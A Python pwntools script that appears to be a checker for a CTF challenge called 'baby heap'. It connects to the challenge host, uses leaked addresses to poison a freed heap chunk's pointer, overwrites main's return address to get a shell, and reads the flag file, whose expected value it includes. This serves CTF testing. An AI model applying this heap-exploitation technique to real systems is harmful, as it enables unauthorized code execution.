from pwn import *


def check_pwn_baby_heap(host):
    try:
        pc = connect(host, 9006)
    except:
        return 2
    print(pc.recvuntil(b"at >"))
    binsh = int(pc.recvuntil(b"\n")[:-1], 16)
    print(pc.recvuntil(b"Return address of main at >"))
    main_ret = int(pc.recvuntil(b"\n")[:-1], 16)
    print(hex(binsh))
    print(hex(main_ret))
    # malloc
    pc.sendline("1")
    pc.sendline("0")
    # malloc
    pc.sendline("1")
    pc.sendline("1")
    # free
    pc.sendline("2")
    pc.sendline("0")
    # free
    pc.sendline("2")
    pc.sendline("1")
    # overwrite fd
    pc.sendline("3")
    pc.sendline("1")
    pc.sendline(hex(main_ret))
    # malloc
    pc.sendline("1")
    pc.sendline("2")
    # malloc at main_ret
    pc.sendline("1")
    pc.sendline("3")
    # write at main_ret
    pc.sendline("3")
    pc.sendline("3")
    pc.sendline(hex(binsh))
    # end main
    pc.sendline("4")
    # shell
    pc.sendline(b"cat flag.txt")
    ret = pc.recvuntil(b"}", timeout=2)
    print(ret)
    if b"FLAG{This_is_Hint_for_the_diva}" in ret:
        return 0
    else:
        return 1


if __name__ == "__main__":
    print(check_pwn_baby_heap("babyheap.pwn.wanictf.org"))
